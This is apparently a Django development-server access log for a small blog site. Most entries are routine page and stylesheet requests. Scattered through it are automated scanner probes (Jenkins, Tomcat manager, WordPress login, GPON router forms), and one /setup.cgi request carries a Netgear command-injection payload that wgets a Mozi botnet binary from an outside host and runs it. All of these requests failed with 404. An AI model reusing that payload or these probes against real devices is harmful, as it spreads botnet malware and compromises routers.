  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
Not Found: /login
[15/Jan/2021 10:25:33] "GET /login HTTP/1.0" 404 2121
Not Found: /jenkins/login
[15/Jan/2021 10:25:34] "GET /jenkins/login HTTP/1.0" 404 2145
Not Found: /manager/html
[15/Jan/2021 10:25:34] "GET /manager/html HTTP/1.0" 404 2142
[15/Jan/2021 11:00:04] "GET / HTTP/1.1" 200 979
[15/Jan/2021 11:37:55] "GET / HTTP/1.0" 200 979
Not Found: /setup.cgi
[15/Jan/2021 12:51:09] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2295
[15/Jan/2021 13:08:17] "GET / HTTP/1.1" 200 979
[15/Jan/2021 13:08:17] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:08:17] "GET /static/css/blog_base_header.css HTTP/1.1" 200 848
[15/Jan/2021 13:08:17] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:08:17] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 13:08:17] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 13:08:17] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
Not Found: /GponForm/diag_Form
[15/Jan/2021 13:16:05] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 2168
----------------------------------------
Exception happened during processing of request from ('117.60.152.52', 6433)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Jan/2021 13:16:15] "HEAD / HTTP/1.0" 200 979
----------------------------------------
Exception happened during processing of request from ('199.101.123.176', 51248)
Traceback (most recent call last):
  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
    self.handle()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.6/socket.py", line 586, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[15/Jan/2021 13:34:50] "GET / HTTP/1.1" 200 979
[15/Jan/2021 13:34:50] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:34:50] "GET /static/css/blog_base_header.css HTTP/1.1" 200 848
[15/Jan/2021 13:34:50] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:34:50] "GET /static/images/logo_signup.png HTTP/1.1" 200 1113
[15/Jan/2021 13:34:50] "GET /static/images/logo_signin.png HTTP/1.1" 200 888
[15/Jan/2021 13:37:04] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:37:04] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:37:04] "GET /static/css/blog_base_header.css HTTP/1.1" 200 783
[15/Jan/2021 13:37:04] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:37:05] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:40:06] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:40:06] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:40:06] "GET /static/css/blog_base_header.css HTTP/1.1" 200 784
[15/Jan/2021 13:40:06] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:40:06] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:40:21] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:40:21] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:40:21] "GET /static/css/blog_base_header.css HTTP/1.1" 200 784
[15/Jan/2021 13:40:21] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:40:21] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:40:33] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:40:33] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:40:34] "GET /static/css/blog_base_header.css HTTP/1.1" 200 784
[15/Jan/2021 13:40:34] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:40:34] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
Not Found: /config/getuser
[15/Jan/2021 13:42:20] "GET /config/getuser?index=0 HTTP/1.1" 404 2160
Not Found: /wp-login.php
[15/Jan/2021 13:43:07] "GET /wp-login.php HTTP/1.1" 404 2140
Not Found: /wp-login.php
[15/Jan/2021 13:43:09] "GET /wp-login.php HTTP/1.1" 404 2140
[15/Jan/2021 13:45:10] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:45:11] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:45:11] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1030
[15/Jan/2021 13:45:11] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:45:11] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:46:17] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:46:17] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:46:17] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1106
[15/Jan/2021 13:46:17] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:46:17] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:46:37] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:46:37] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:46:37] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1185
[15/Jan/2021 13:46:37] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:46:37] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:46:43] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:46:43] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:46:43] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1185
[15/Jan/2021 13:46:43] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:46:43] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:46:54] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:46:54] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:46:54] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1184
[15/Jan/2021 13:46:54] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:46:54] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:47:20] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:47:21] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:47:21] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1262
[15/Jan/2021 13:47:21] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:47:21] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:47:38] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:47:38] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:47:38] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1295
[15/Jan/2021 13:47:38] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:47:38] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:47:48] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:47:49] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:47:49] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1262
[15/Jan/2021 13:47:49] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:47:49] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:48:02] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:48:02] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:48:02] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1284
[15/Jan/2021 13:48:02] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:48:03] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:48:19] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:48:19] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:48:19] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1284
[15/Jan/2021 13:48:19] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:48:19] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:48:24] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:48:25] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1284
[15/Jan/2021 13:48:25] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:48:25] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:48:25] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:50:40] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:50:41] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:50:41] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1370
[15/Jan/2021 13:50:41] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:50:41] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:50:42] "GET / HTTP/1.1" 200 948
[15/Jan/2021 13:50:42] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:50:42] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1370
[15/Jan/2021 13:50:42] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:50:42] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
Not Found: /favicon.ico
[15/Jan/2021 13:50:50] "GET /favicon.ico HTTP/1.1" 404 2137
[15/Jan/2021 13:50:58] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:50:58] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:50:58] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1370
[15/Jan/2021 13:50:58] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:50:58] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:53:05] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:53:05] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:53:05] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1412
[15/Jan/2021 13:53:05] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:53:06] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:53:06] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:53:06] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:53:06] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1412
[15/Jan/2021 13:53:06] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:53:06] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:53:27] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:53:27] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:53:27] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1440
[15/Jan/2021 13:53:27] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:53:27] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:53:36] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:53:37] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:53:37] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1440
[15/Jan/2021 13:53:37] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:53:37] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:53:41] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:53:41] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:53:41] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1440
[15/Jan/2021 13:53:41] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:53:41] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:53:46] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:53:46] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:53:46] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1440
[15/Jan/2021 13:53:46] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:53:46] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:54:02] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:54:02] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:54:02] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1454
[15/Jan/2021 13:54:02] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:54:02] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:54:07] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:54:07] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:54:07] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1455
[15/Jan/2021 13:54:07] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:54:07] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:54:45] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:54:54] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:54:55] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:54:55] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1442
[15/Jan/2021 13:54:55] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:54:55] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 13:55:01] "GET / HTTP/1.1" 200 968
[15/Jan/2021 13:55:01] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 13:55:01] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1442
[15/Jan/2021 13:55:01] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 13:55:01] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:09:24] "GET / HTTP/1.1" 200 1006
[15/Jan/2021 14:09:24] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:09:24] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1442
[15/Jan/2021 14:09:24] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:09:24] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:09:42] "GET / HTTP/1.1" 200 1006
[15/Jan/2021 14:09:42] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:09:42] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1436
[15/Jan/2021 14:09:42] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:09:42] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:11:17] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:11:17] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:11:17] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1203
[15/Jan/2021 14:11:17] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:11:18] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:11:32] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:11:32] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:11:32] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1205
[15/Jan/2021 14:11:32] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:11:32] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:12:50] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:12:50] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:12:50] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1221
[15/Jan/2021 14:12:50] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:12:50] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:13:21] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:13:21] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:13:21] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1216
[15/Jan/2021 14:13:21] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:13:22] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:13:40] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:13:40] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:13:40] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1191
[15/Jan/2021 14:13:40] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:13:40] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:14:28] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:14:29] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:14:29] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1207
[15/Jan/2021 14:14:29] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:14:29] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:14:38] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:14:38] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:14:38] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1207
[15/Jan/2021 14:14:38] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:14:38] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:15:41] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:15:42] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:15:42] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1229
[15/Jan/2021 14:15:42] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:15:42] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:16:12] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:16:12] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:16:12] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1245
[15/Jan/2021 14:16:12] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:16:13] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:16:20] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:16:20] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:16:20] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1248
[15/Jan/2021 14:16:20] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:16:20] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:16:21] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:16:21] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:16:21] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1248
[15/Jan/2021 14:16:21] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:16:33] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:16:33] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:16:33] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1249
[15/Jan/2021 14:16:33] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:16:33] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:16:57] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:16:57] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:16:57] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1247
[15/Jan/2021 14:16:57] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:16:58] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:17:06] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:17:07] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:17:07] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1249
[15/Jan/2021 14:17:07] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:17:07] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:17:14] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:17:14] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:17:14] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1232
[15/Jan/2021 14:17:14] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:17:14] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:17:26] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:17:26] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1263
[15/Jan/2021 14:17:26] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:17:26] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:17:26] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:18:35] "GET / HTTP/1.1" 200 1261
[15/Jan/2021 14:18:35] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:18:35] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1487
[15/Jan/2021 14:18:35] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:18:35] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
Not Found: /manager/html/
[15/Jan/2021 14:18:54] "GET /manager/html/ HTTP/1.0" 404 2145
[15/Jan/2021 14:19:39] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:19:40] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:19:40] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:19:40] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1487
[15/Jan/2021 14:19:40] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:21:17] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:21:17] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:21:17] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1487
[15/Jan/2021 14:21:17] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:21:17] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:21:32] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:21:32] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:21:32] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1487
[15/Jan/2021 14:21:32] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:21:32] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:21:47] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:21:47] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:21:47] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1487
[15/Jan/2021 14:21:47] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:21:47] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:22:13] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:22:13] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:22:13] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:22:13] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 24
[15/Jan/2021 14:22:14] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:22:55] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:22:55] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:22:55] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:22:55] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 170
[15/Jan/2021 14:22:56] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:23:04] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:23:04] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:23:04] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:23:04] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 170
[15/Jan/2021 14:23:04] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:23:14] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:23:14] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:23:14] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:23:14] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 170
[15/Jan/2021 14:23:14] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
Not Found: /manager/text/list
[15/Jan/2021 14:23:24] "GET /manager/text/list HTTP/1.1" 404 2158
[15/Jan/2021 14:23:28] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:23:28] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:23:28] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:23:28] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 170
[15/Jan/2021 14:23:28] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:23:44] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:23:44] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
[15/Jan/2021 14:23:44] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1488
[15/Jan/2021 14:23:44] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 171
[15/Jan/2021 14:23:45] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
[15/Jan/2021 14:23:58] "GET / HTTP/1.1" 200 1177
[15/Jan/2021 14:23:58] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
